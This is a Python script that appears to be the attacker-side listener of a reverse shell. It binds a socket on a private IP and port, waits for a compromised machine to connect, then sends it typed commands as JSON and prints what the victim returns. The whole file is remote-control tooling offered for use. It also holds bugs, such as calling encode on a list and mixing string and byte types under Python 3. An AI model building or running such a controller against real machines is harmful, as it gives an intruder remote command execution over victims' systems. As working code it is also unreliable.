import socket
import json

class SocketListener:
    def __init__(self,ip,port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))  
        s.listen(0)  
        print("Listening...")
        (self.my_connection, ip_addr) = s.accept()
        print("Connection OK" + str(ip_addr))

    def json_send(self,data):
        json_output = json.dumps(data)
        self.my_connection.send(json_output)

    def json_receiver(self):
        json_recv = ""
        while True:
            try:

                json_recv = json_recv + self.my_connection.recv(1024)
                return json.loads(json_recv.decode("utf-8"))
            except ValueError:
                continue



    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "quit":
            self.my_connection.close()
            exit()
        return self.json_receiver()


    def listener(self):
        while True:
            command_input = input("Enter command:")
            command_input = command_input.split(" ")
            try:
                command_output = self.command_execution(command_input.encode("utf-8"))
                print(command_output)
            except TypeError:
                print("Python 3 uyumluluk sorunu!!!")



my_listener = SocketListener("192.168.1.37",8080)
my_listener.listener()




